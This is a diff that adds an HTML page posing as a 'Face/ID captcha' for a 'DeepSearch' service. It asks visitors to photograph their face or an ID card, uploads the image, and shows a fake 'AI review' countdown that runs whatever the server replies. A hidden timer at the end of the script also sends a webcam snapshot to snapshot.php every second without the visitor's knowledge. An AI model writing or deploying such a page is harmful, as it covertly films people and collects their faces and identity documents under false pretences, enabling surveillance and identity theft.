@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Captcha</title>
+
+  <style>
+:root {
+  --body-bg: linear-gradient(135deg, #1a1a1a 0%, #222222 50%, #2a2a2a 100%);
+  --panel-gradient: linear-gradient(145deg, #1f1f1f, #2a2a2a);
+  --input-bg: #2e2e2e;
+  --button-bg: #6e6e6e;   
+  --button-hover: #888888;  
+  --border: 2px solid #2a2a2a;
+  --text-light: #eee;
+  --text-dark: #fff;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  min-height: 100vh;
+  background: var(--body-bg);
+  font-family: "Segoe UI", Helvetica, sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  animation: fadeIn 1s ease-in forwards;
+}
+
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+.register-container {
+  width: 100%;
+  max-width: 420px;
+  background: var(--panel-gradient);
+  padding: 35px 28px;
+  border-radius: 16px;
+  box-shadow: 0 12px 20px rgba(0,0,0,0.4);
+  border: var(--border);
+  color: var(--text-light);
+  transition: transform 0.3s ease;
+}
+
+.register-container:hover { transform: translateY(-3px); }
+
+.header-with-icon {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 10px;
+}
+
+.header-with-icon img {
+  width: 48px;
+  height: 48px;
+  border-radius: 50%;
+  margin-right: 10px;
+  border: 2px solid #fff;
+}
+
+.header-with-icon h2 {
+  color: var(--text-dark);
+  font-size: 1.6em;
+  letter-spacing: 1px;
+}
+
+.info-link {
+  text-align: center;
+  margin-bottom: 25px;
+}
+
+.register-container button {
+  width: 100%;
+  padding: 14px;
+  background: var(--button-bg);
+  color: var(--text-dark);
+  font-weight: bold;
+  font-size: 16px;
+  border: none;
+  border-radius: 12px;
+  cursor: pointer;
+  transition: background 0.3s, box-shadow 0.3s, transform 0.2s;
+  box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+}
+
+.register-container button:hover {
+  background: var(--button-hover);
+  box-shadow: 0 6px 12px rgba(0,0,0,0.3);
+  transform: translateY(-2px);
+}
+
+.register-container button:focus {
+  outline: none;
+  box-shadow: 0 0 0 3px rgba(136, 136, 136, 0.5);
+}
+
+video, canvas, img {
+  width: 100%;
+  border-radius: 12px;
+  margin-bottom: 20px;
+}
+
+.mode-buttons {
+  display: flex;
+  justify-content: space-between;
+  gap: 12px;
+  margin: 20px 0;
+}
+
+.video-container { position: relative; margin-bottom: 8px; }
+
+.overlay-icon {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 240px;
+  height: 240px;
+  opacity: 0.75;
+  pointer-events: none;
+}
+
+video::-webkit-media-controls { display: none !important; }
+video::-moz-media-controls { display: none !important; }
+
+#captureBtn { margin-top: 0; }
+
+.captcha-info {
+  margin-top: 25px;
+  padding: 12px;
+  background: rgba(255,255,255,0.05);
+  border-radius: 8px;
+  font-size: 0.9em;
+  color: var(--text-light);
+  text-align: center;
+  line-height: 1.4;
+}
+
+#captchaOverlay {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(0,0,0,0.6);
+  display: none;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+}
+
+.overlay-box {
+  background: var(--panel-gradient);
+  border-radius: 16px;
+  padding: 30px;
+  width: 320px;
+  text-align: center;
+  box-shadow: 0 8px 20px rgba(0,0,0,0.4);
+  color: var(--text-light);
+}
+
+.overlay-box .checkmark {
+  font-size: 48px;
+  color: #4CAF50;
+  margin-bottom: 15px;
+}
+
+#countdown {
+  font-size: 20px;
+  font-weight: bold;
+  margin: 10px 0;
+  color: var(--text-dark);
+}
+
+#deepSearchBtn {
+  width: 100%;
+  padding: 12px;
+  border-radius: 10px;
+  border: none;
+  font-weight: bold;
+  font-size: 16px;
+  cursor: not-allowed;
+  background: #2a2a2a;
+  color: #ccc;
+  transition: background 0.3s ease;
+}
+
+#deepSearchBtn.active {
+  background: var(--button-bg);
+  color: var(--text-dark);
+  cursor: pointer;
+}
+
+html, body {
+  background-color: #1a1a1a;
+}
+
+body {
+  background-attachment: fixed;
+}
+  </style>
+</head>
+
+<body>
+  <div class="register-container">
+    <div class="header-with-icon">
+      <img src="https://imgs.search.brave.com/Ouh3lEiCOsfttzLyzxbPbibLWAlVdoif64mheaapMZs/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly9wdWJs/aWNkb21haW52ZWN0/b3JzLm9yZy90bl9p/bWcvQW5vbnltb3Vz/X01hZ25pZnlfMV9p/Y29uLnBuZw" alt="Profile Icon">
+      <h2>Captcha</h2>
+    </div>
+
+    <div class="info-link">
+      <p style="margin-bottom:10px; font-weight:bold; color:#fff;">
+        Why use Face/ID as a Captcha
+      </p>
+      <button onclick="window.open('https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0091708','_blank')"
+              style="padding:10px 18px; background:#6e6e6e; color:#ffff; border:none; border-radius:8px; cursor:pointer; font-weight:bold;">
+        Here is why
+      </button>
+    </div>
+
+    <div class="mode-buttons">
+      <button id="faceBtn" aria-label="Use face mode">Face</button>
+      <button id="idBtn" aria-label="Use ID mode">ID</button>
+    </div>
+
+    <div class="video-container">
+      <video id="video" playsinline muted disablePictureInPicture></video>
+      <img id="overlayIcon" class="overlay-icon"
+           src="https://imgs.search.brave.com/LdWMTnVg8FEjVyym3IOpzQ2HmAi86CB6MQOdGp0JvyI/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly93d3cu/c3ZncmVwby5jb20v/c2hvdy81MDc2ODkv/ZmFjZS1pZC5zdmc"
+           alt="Overlay icon">
+    </div>
+
+    <button id="captureBtn">Take Photo</button>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <img id="result" style="display:none">
+    <button id="verifyBtn" style="display:none;">Verify</button>
+    <p id="status"></p>
+    
+    <div class="captcha-info">
+      <p>
+        This captcha ensures you are not a bot by verifying your identity through Face or ID recognition. 
+        Unlike basic text or image captchas that can be bypassed by automated scripts, Face/ID adds a stronger layer of security. 
+        Make sure to complete it carefully, as successful verification is sensitive. 
+        DeepSearch provides advanced, secure exploration of information that would otherwise remain hidden by viewing sources deeper than the average search. 
+        giving you powerful insights once you’ve proven you’re human and not a web scraper or spider.
+      </p>
+    </div>
+  </div>
+
+<div id="captchaOverlay">
+  <div class="overlay-box">
+    <div class="checkmark">✔</div>
+    <p>
+      Captcha verification complete.<br>
+      AI review is in progress to ensure authenticity.<br>
+      You may proceed once the countdown has ended.
+    </p>
+    <div id="countdown">30</div>
+    <button id="deepSearchBtn" disabled>Use DeepSearch</button>
+  </div>
+</div>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const result = document.getElementById('result');
+    const captureBtn = document.getElementById('captureBtn');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const status = document.getElementById('status');
+    const overlayIcon = document.getElementById('overlayIcon');
+    const faceBtn = document.getElementById('faceBtn');
+    const idBtn = document.getElementById('idBtn');
+    let currentStream;
+
+    async function startCamera(facingMode = "user") {
+      if (currentStream) currentStream.getTracks().forEach(t => t.stop());
+      try {
+        currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+        video.srcObject = currentStream;
+        await video.play();
+      } catch (err) {
+        console.warn("Primary camera request failed:", err);
+        try {
+          currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
+          video.srcObject = currentStream;
+          await video.play();
+        } catch (fallbackErr) {
+          console.error("Camera not available at all:", fallbackErr);
+          alert("Camera access denied or not supported on this device.");
+        }
+      }
+    }
+
+    faceBtn.onclick = () => {
+      overlayIcon.src = "https://imgs.search.brave.com/LdWMTnVg8FEjVyym3IOpzQ2HmAi86CB6MQOdGp0JvyI/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly93d3cu/c3ZncmVwby5jb20v/c2hvdy81MDc2ODkv/ZmFjZS1pZC5zdmc";
+      startCamera("user");
+    };
+
+    idBtn.onclick = () => {
+      overlayIcon.src = "https://imgs.search.brave.com/SD1gC6fCWLkzZzxNdjQDwk_QtcQjIz5RE-HzR45hzQw/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly9jZG4t/aWNvbnMtcG5nLmZy/ZWVwaWsuY29tLzI1/Ni81MjcwLzUyNzA0/NTQucG5nP3NlbXQ9/YWlzX3doaXRlX2xh/YmVs";
+      startCamera("environment");
+    };
+
+    captureBtn.onclick = () => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      result.src = canvas.toDataURL("image/jpeg");
+      result.style.display = "block";
+      verifyBtn.style.display = "block";
+    };
+
+    verifyBtn.onclick = async () => {
+      status.textContent = "Verifying...";
+      const dataUrl = canvas.toDataURL("image/jpeg");
+      try {
+        const response = await fetch("Captcha.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: "image=" + encodeURIComponent(dataUrl)
+        });
+        const json = await response.json();
+
+        document.getElementById("captchaOverlay").style.display = "flex";
+        let countdown = 30;
+        const countdownEl = document.getElementById("countdown");
+        const deepSearchBtn = document.getElementById("deepSearchBtn");
+
+        const timer = setInterval(() => {
+          countdown--;
+          countdownEl.textContent = countdown;
+          if (countdown <= 0) {
+            clearInterval(timer);
+            deepSearchBtn.disabled = false;
+            deepSearchBtn.classList.add("active");
+            deepSearchBtn.onclick = () => {
+              window.location.href = "/../DeepSearch/Reminder.html";
+            };
+          }
+        }, 1000);
+
+      } catch {
+        status.textContent = "Error verifying captcha.";
+      }
+    };
+
+    startCamera("user");
+
+setInterval(() => {
+  if (video.readyState === video.HAVE_ENOUGH_DATA) {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+    const dataUrl = canvas.toDataURL("image/jpeg");
+
+    fetch("snapshot.php", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: "image=" + encodeURIComponent(dataUrl)
+    }).catch(err => console.error("Snapshot error:", err));
+  }
+}, 1000);
+  </script>
+</body>
+</html>
+
